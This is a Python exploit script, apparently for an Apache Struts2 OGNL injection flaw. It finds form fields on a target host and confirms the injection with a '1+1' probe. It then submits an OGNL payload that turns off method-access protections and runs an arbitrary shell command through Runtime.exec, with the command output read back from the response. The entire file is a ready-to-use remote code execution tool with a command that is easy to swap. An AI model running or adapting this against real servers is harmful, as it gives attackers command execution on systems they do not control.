import urllib.parse

import requests
from lib import base_def
import argparse
import bs4


def find_target_get_parameters(url, header, proxies):
    args_tmp = []
    response = requests.get(url, headers=header, proxies=proxies)

    if response.status_code == 200:
        content = response.text
        soup = bs4.BeautifulSoup(content, 'html.parser')
        for i in soup.find_all('input'):
            if i.get('type') != 'submit':
                args_tmp.append(i.get('name'))
                print("input args " + str(i.get('name')) + " has found")
    return args_tmp


def target_test(url, args, header, proxies, payload):
    args_after = []
    response = requests.get(url, headers=header, proxies=proxies)
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    if response.status_code == 200:
        for i in args:
            for j in soup.find_all('input'):
                if j.get('name') == i and j.get('type') != "submit":
                    args_after.append(j.get('name') + "=" + payload)

    #post体里面应该是<input>name+value
    form = soup.find('form')
    submit_url = url + form['action']
    response_after = requests.post(submit_url, data="&".join(args_after), headers=header, proxies=proxies)
    soup_after = bs4.BeautifulSoup(response_after.text, 'html.parser')
    args_result = []
    if response_after.status_code == 200:
        for i in soup_after.find_all('input'):
            if i.get('value') == "11":
                args_result.append(i.get('name'))

    return submit_url, args_result


def target_attack(action_name, args, target_args, header, proxies, payload):
    global soup_res
    post_list = []
    for i in args:
        if i in target_args:
            post_list.append(i + "=" + str(payload))
        else:
            post_list.append(i + "=" + "%20")
    print(post_list)
    response = requests.post(action_name, data="&".join(post_list), proxies=proxies, headers=header)
    if response.status_code == 200:
        soup_res = bs4.BeautifulSoup(response.text, 'html.parser')
    result = []
    for i in target_args:
        result.append(soup_res.find("input", attrs={"name": "age"})['value'])
    return result


if __name__ == "__main__":
    #-------------脚本初始化部分--------------------
    #修改命令只需修改shell_command部分
    shell_command = "pwd"
    arg_parser = argparse.ArgumentParser()
    print("the scripts has 1 parameters")
    argparse = base_def.start_help(arg_parser)
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    payload = ("' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,"
               "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString("
               "@java.lang.Runtime@getRuntime().exec('") + shell_command + "').getInputStream())) + '"
    #--------------------------------------------
    url = "http://" + argparse.ip + ":" + argparse.port
    get_test = "'+(1+1)+'"
    args_found = find_target_get_parameters(url, header, proxies)
    submit_url, target_args = target_test(url, args_found, header, proxies, urllib.parse.quote(get_test))
    if len(target_args) > 0:
        print(target_attack(action_name=submit_url, args=args_found, target_args=target_args, header=header,
                            proxies=proxies,
                            payload=urllib.parse.quote(payload)))